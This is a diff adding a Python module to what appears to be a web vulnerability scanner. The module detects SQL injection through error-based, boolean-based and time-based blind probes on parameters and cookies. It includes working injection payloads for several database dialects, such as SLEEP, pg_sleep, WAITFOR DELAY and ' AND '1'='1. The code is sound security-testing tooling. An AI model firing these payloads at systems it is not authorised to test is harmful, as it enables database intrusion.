@@ -1,0 +1,336 @@
+"""SQL injection detection (error-based, boolean-based, and time-based blind)."""
+
+from __future__ import annotations
+
+import re
+from difflib import SequenceMatcher
+
+from ...models import Category, Finding, Severity
+from ..base import Module, ScanContext, register
+from ._util import baseline, send_with_param
+
+SQL_ERRORS = [
+    r"SQL syntax.*MySQL",
+    r"Warning.*mysql_",
+    r"valid MySQL result",
+    r"PostgreSQL.*ERROR",
+    r"pg_query\(\)",
+    r"SQLite/JDBCDriver",
+    r"SQLite3::",
+    r"System\.Data\.SQLite\.SQLiteException",
+    r"Microsoft OLE DB Provider for SQL Server",
+    r"Unclosed quotation mark after the character string",
+    r"ORA-[0-9]{5}",
+    r"Oracle error",
+    r"quoted string not properly terminated",
+    r"sqlite3\.OperationalError",
+    r"sqlalchemy\.exc\.\w*Error",
+    r"org\.postgresql\.util\.PSQLException",
+    r"com\.mysql\.jdbc\.exceptions",
+    r"Data source rejected establishment of connection",
+    r"supplied argument is not a valid \w+ result",
+]
+SQL_ERROR_RE = re.compile("|".join(SQL_ERRORS), re.IGNORECASE)
+
+# (dialect label, payload suffix, expected native delay flag) -- WHERE-context
+# variants use concat/stacked forms because cookie values (TrackingId-style
+# labs) are injected INSIDE a WHERE clause.
+TIME_PAYLOADS = [
+    ("MySQL/MariaDB", "' OR SLEEP({d})-- -", 1),
+    ("MySQL/MariaDB", "'||(SELECT SLEEP({d}))||'", 1),
+    ("PostgreSQL", "'; SELECT pg_sleep({d})-- -", 1),
+    ("PostgreSQL", "'||(SELECT pg_sleep({d}))||'", 1),
+    ("MSSQL", "'; WAITFOR DELAY '0:0:{d}'-- -", 1),
+    ("Oracle", "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{d})-- -", 1),
+    ("Oracle", "'||DBMS_PIPE.RECEIVE_MESSAGE('a',{d})||'", 1),
+    ("SQLite", "' OR (SELECT COUNT(*) FROM sqlite_master AS t1, sqlite_master AS t2, "
+     "sqlite_master AS t3)>0-- -", 0),  # no native sleep; skipped for timing, kept for completeness
+]
+
+DELAY_SECONDS = 4
+TIME_THRESHOLD = 2.5  # observed extra delay must clear this to count as a hit
+CONTENT_SIMILARITY_THRESHOLD = 0.98  # true/false pages this similar are "the same page"
+POLARITY_MARGIN = 0.04  # min |sim(true~base) - sim(false~base)| for an asymmetric oracle
+
+
+def _similarity(a: str, b: str) -> float:
+    if not a and not b:
+        return 1.0
+    return SequenceMatcher(None, a, b).ratio()
+
+
+# --- text-chunk differential (small-answer / large-page oracles) ----------
+
+_CHUNK_SPLIT_RE = re.compile(r"<[^>]*>|\n")
+_PROBE_REFLECTION_RE = re.compile(
+    r"1'\s*=\s*'1|1'\s*=\s*'2|'\s*AND\s+'1|AND\s+1\s*=\s*1|AND\s+1\s*=\s*2",
+    re.IGNORECASE,
+)
+
+
+def _chunk_set(html: str) -> frozenset[str]:
+    """Visible text chunks of a page as an exact set (tags/newlines split)."""
+    parts = _CHUNK_SPLIT_RE.split(html or "")
+    return frozenset(p.strip() for p in parts if len(p.strip()) >= 3)
+
+
+def _chunk_differential(base_text: str, true_text: str, false_text: str) -> bool:
+    """True when TRUE/FALSE pages differ in real content chunks while the
+    baseline deterministically reproduces exactly one of the two pages.
+
+    Reflections of the probe payload itself (' AND '1'='1) are ignored --
+    an echo is not an oracle.
+    """
+    b, t, f = _chunk_set(base_text), _chunk_set(true_text), _chunk_set(false_text)
+    if not t or not f:
+        return False
+    # determinism guard: pages with per-request noise never match the
+    # baseline exactly, which kills every false positive from rotating
+    # content (CSRF nonces, timestamps, ads)
+    if b != t and b != f:
+        return False
+    diff = t ^ f
+    if not diff:
+        return False
+    clean = [c for c in diff if not _PROBE_REFLECTION_RE.search(c)]
+    return bool(clean)
+
+
+def pages_differ_by_chunks(true_text: str, false_text: str) -> bool:
+    """True when two pages carry different content chunks (payload echo
+    excluded). Used by the exploit-side oracle calibration, which has no
+    baseline page to test determinism against."""
+    t, f = _chunk_set(true_text), _chunk_set(false_text)
+    if not t or not f:
+        return False
+    diff = t ^ f
+    if not diff:
+        return False
+    return any(not _PROBE_REFLECTION_RE.search(c) for c in diff)
+
+
+@register
+class SqliModule(Module):
+    name = "sqli"
+    categories = [Category.SQLI]
+    passive = False
+    aggressive_required = True
+
+    async def run(self, ctx: ScanContext) -> list[Finding]:
+        findings: list[Finding] = []
+        for rt in ctx.request_targets:
+            for param in rt.params:
+                found = await self._check_error_based(ctx, rt, param)
+                if found:
+                    findings.append(found)
+                    continue
+
+                found = await self._check_boolean_based(ctx, rt, param)
+                if found:
+                    findings.append(found)
+                    continue
+
+                found = await self._check_time_based(ctx, rt, param)
+                if found:
+                    findings.append(found)
+
+        findings.extend(await self._check_cookies(ctx))
+        return findings
+
+    # Cookie parameters (e.g. PortSwigger-style TrackingId) are request
+    # inputs too: override each jar cookie with injection probes. Cookies
+    # are overridden per-request only -- the session jar is never mutated.
+    MAX_COOKIE_SOURCES = 12   # dedicated cookie-consumer pages get priority
+    MAX_COOKIE_FALLBACK = 8   # generic targets probed as fallback
+    MAX_COOKIES = 4
+    COOKIE_TIME_TARGETS = 2   # sleep-payload probes are expensive
+
+    async def _check_cookies(self, ctx: ScanContext) -> list[Finding]:
+        findings: list[Finding] = []
+        jar = ctx.client.jar_cookies()
+        if not jar:
+            return findings
+        cookies = list(jar.items())[: self.MAX_COOKIES]
+        seen_cookies: set[str] = set()
+        # Pages the crawler flagged as cookie consumers first (they are the
+        # likeliest place a cookie value reaches a SQL query), then the
+        # remaining targets as fallback.
+        targets = [rt for rt in ctx.request_targets if rt.source == "cookie"][: self.MAX_COOKIE_SOURCES]
+        targets += [rt for rt in ctx.request_targets if rt.source != "cookie"][: self.MAX_COOKIE_FALLBACK]
+        time_targets = 0
+        for rt in targets:
+            for name, value in cookies:
+                if name in seen_cookies:
+                    continue
+                param = f"cookie:{name}"
+                found = await self._check_error_based(ctx, rt, param, base_value=value)
+                if found:
+                    seen_cookies.add(name)
+                    findings.append(found)
+                    continue
+                found = await self._check_boolean_based(ctx, rt, param, base_value=value)
+                if found:
+                    seen_cookies.add(name)
+                    findings.append(found)
+                    continue
+                # Time-based cookie probes carry sleep payloads -- keep the
+                # cost bounded by probing each cookie on at most the first
+                # couple of targets.
+                if time_targets < self.COOKIE_TIME_TARGETS:
+                    time_targets += 1
+                    found = await self._check_time_based(ctx, rt, param, base_value=value)
+                    if found:
+                        seen_cookies.add(name)
+                        findings.append(found)
+        return findings
+
+    async def _check_error_based(self, ctx: ScanContext, rt, param: str, base_value: str | None = None) -> Finding | None:
+        if base_value is None:
+            base_value = rt.params.get(param, "")
+        r = await send_with_param(ctx.client, rt, param, base_value + "'\"")
+        if not r.ok:
+            return None
+        m = SQL_ERROR_RE.search(r.text)
+        if not m:
+            return None
+        return Finding(
+            category=Category.SQLI,
+            title=f"Error-based SQL injection in '{param}'",
+            severity=Severity.CRITICAL,
+            confidence="confirmed",
+            url=rt.url,
+            description=f"Injecting a quote into '{param}' produced a database error.",
+            evidence=f"DB error signature: {m.group(0)!r}",
+            request=f"{rt.method} {rt.url} ({param}=<value>'\")",
+            response_excerpt=r.text[:300],
+            remediation="Use parameterized queries / prepared statements; never build SQL from input.",
+            cwe="CWE-89",
+            module=self.name,
+            verified=True,
+        )
+
+    async def _check_boolean_based(self, ctx: ScanContext, rt, param: str, base_value: str | None = None) -> Finding | None:
+        if base_value is None:
+            base_value = rt.params.get(param, "")
+        base = await baseline(ctx.client, rt)
+        true_r = await send_with_param(ctx.client, rt, param, base_value + "' AND '1'='1")
+        false_r = await send_with_param(ctx.client, rt, param, base_value + "' AND '1'='2")
+        if not (base.ok and true_r.ok and false_r.ok):
+            return None
+
+        # A real boolean-blind vuln: the TRUE payload's page looks like baseline,
+        # the FALSE payload's page looks different from both. Compare *content*,
+        # not raw length, and also treat a status-code flip as a strong signal.
+        status_signal = (
+            true_r.status == base.status
+            and false_r.status != base.status
+        )
+
+        true_vs_base = _similarity(true_r.text, base.text)
+        false_vs_base = _similarity(false_r.text, base.text)
+        true_vs_false = _similarity(true_r.text, false_r.text)
+
+        # Polarity-agnostic: a real boolean oracle shows a TRUE/FALSE page
+        # differential while ONE of the two payloads reproduces the baseline
+        # (deterministic behaviour). Classic labs put the "same as baseline"
+        # side on the TRUE payload (content hidden on FALSE); TrackingId-style
+        # labs ("Blind SQL injection with conditional responses") put it on
+        # the FALSE side -- the TRUE payload *adds* a "Welcome back" banner
+        # the baseline lacks. Both polarities must be accepted.
+        content_signal = (
+            true_vs_false < CONTENT_SIMILARITY_THRESHOLD
+            and (
+                max(true_vs_base, false_vs_base) >= CONTENT_SIMILARITY_THRESHOLD
+                or abs(true_vs_base - false_vs_base) >= POLARITY_MARGIN
+            )
+        )
+
+        # Chunk-level differential: whole-page similarity is too coarse when
+        # the oracle's answer changes only a SMALL part of a LARGE page (the
+        # "conditional responses" family renders one "Welcome back" block
+        # inside a multi-kilobyte shop page -- similarity stays >= 0.98 and
+        # every similarity-based signal vanishes). Compare exact text-chunk
+        # sets instead: if the baseline deterministically matches one of the
+        # two payload pages and the two payload pages differ in non-payload
+        # chunks, that is a genuine boolean differential.
+        if not (status_signal or content_signal):
+            content_signal = _chunk_differential(base.text, true_r.text, false_r.text)
+
+        if not (status_signal or content_signal):
+            return None
+
+        return Finding(
+            category=Category.SQLI,
+            title=f"Possible boolean-based SQL injection in '{param}'",
+            severity=Severity.HIGH,
+            confidence="firm",
+            url=rt.url,
+            description=(
+                f"Responses to '1'='1 vs '1'='2 payloads in '{param}' differ in content "
+                "and/or status code, suggesting the input reaches a SQL boolean context."
+            ),
+            evidence=(
+                f"status: base={base.status} true={true_r.status} false={false_r.status} | "
+                f"similarity: true~base={true_vs_base:.3f} false~base={false_vs_base:.3f} "
+                f"true~false={true_vs_false:.3f}"
+            ),
+            request=f"{rt.method} {rt.url} ({param}=...' AND '1'='1 / '1'='2)",
+            remediation="Use parameterized queries; confirm manually with sqlmap.",
+            cwe="CWE-89",
+            module=self.name,
+            verified=False,
+        )
+
+    async def _check_time_based(self, ctx: ScanContext, rt, param: str, base_value: str | None = None) -> Finding | None:
+        # Establish a timing baseline first so slow/loaded targets don't false-positive.
+        base = await baseline(ctx.client, rt)
+        if not base.ok:
+            return None
+        if base_value is None:
+            base_value = rt.params.get(param, "")
+
+        for dialect, template, native_delay in TIME_PAYLOADS:
+            if native_delay == 0:
+                continue  # dialect has no clean timing primitive here; skip
+            payload = template.format(d=DELAY_SECONDS)
+            r = await send_with_param(ctx.client, rt, param, base_value + payload)
+            if not r.ok:
+                continue
+            extra_delay = r.elapsed - base.elapsed
+            if extra_delay < TIME_THRESHOLD:
+                continue
+
+            # Confirm with a second, differently-timed payload to rule out network jitter.
+            confirm_delay_s = DELAY_SECONDS + 2
+            confirm_payload = template.format(d=confirm_delay_s)
+            r2 = await send_with_param(ctx.client, rt, param, base_value + confirm_payload)
+            if not r2.ok:
+                continue
+            extra_delay_2 = r2.elapsed - base.elapsed
+            # Elapsed time should scale roughly with the requested delay.
+            if extra_delay_2 < confirm_delay_s - 1.5:
+                continue
+
+            return Finding(
+                category=Category.SQLI,
+                title=f"Time-based blind SQL injection in '{param}' ({dialect})",
+                severity=Severity.CRITICAL,
+                confidence="confirmed",
+                url=rt.url,
+                description=(
+                    f"Injecting a {dialect} time-delay payload into '{param}' reliably "
+                    "delayed the response by an amount matching the requested delay, "
+                    "across two different delay values."
+                ),
+                evidence=(
+                    f"baseline={base.elapsed:.2f}s | "
+                    f"{DELAY_SECONDS}s payload -> +{extra_delay:.2f}s | "
+                    f"{confirm_delay_s}s payload -> +{extra_delay_2:.2f}s"
+                ),
+                request=f"{rt.method} {rt.url} ({param}=<value>{payload})",
+                remediation="Use parameterized queries / prepared statements; never build SQL from input.",
+                cwe="CWE-89",
+                module=self.name,
+                verified=True,
+            )
+        return None
